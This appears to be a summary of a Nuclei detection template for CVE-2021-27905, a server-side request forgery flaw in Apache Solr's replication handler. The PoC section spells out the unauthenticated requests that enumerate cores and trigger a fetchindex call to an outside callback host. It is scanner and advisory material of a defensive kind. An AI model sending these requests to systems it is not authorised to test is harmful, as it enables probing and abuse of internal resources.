---
cve_id: CVE-2021-27905
template_path: nuclei-templates/http/cves/2021/CVE-2021-27905.yaml
affected_product: Apache Solr
severity: critical
authentication: none
external_callback: true
affected_versions: 8.8.1 and prior
preconditions: []
poc_classification: info-leak
---

## Vulnerability
Apache Solr versions 8.8.1 and prior contain a server-side request forgery vulnerability. The ReplicationHandler (normally registered at "/replication" under a Solr core) uses a "masterUrl" (also "leaderUrl" alias) parameter to designate another ReplicationHandler on another Solr core for index data replication. This parameter is not validated against the same restrictions applied to the "shards" parameter.

Impact: Successful exploitation leads to unauthorized access to internal resources, data leakage, and potential remote code execution (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, score 9.8).

Remediation: Resolved in Apache Solr 8.8.2 and later.

## PoC / Detection
Classification: info-leak

The template first issues `GET /solr/admin/cores?wt=json` and extracts a core name via regex `"name":"(.*?)"`. It then sends `GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh` and matches for `<str name="status">OK</str>` in the response body. This verifies the SSRF by triggering an unauthenticated out-of-band request to an attacker-controlled domain while confirming the replication command succeeds without validation.

## References
- https://www.anquanke.com/post/id/238201
- https://ubuntu.com/security/CVE-2021-27905
- https://nvd.nist.gov/vuln/detail/CVE-2021-27905
- https://nsfocusglobal.com/apache-solr-arbitrary-file-read-and-ssrf-vulnerability-threat-alert/
- https://lists.apache.org/thread.html/r0ddc3a82bd7523b1453cb7a5e09eb5559517145425074a42eb326b10%40%3Cannounce.apache.org%3E
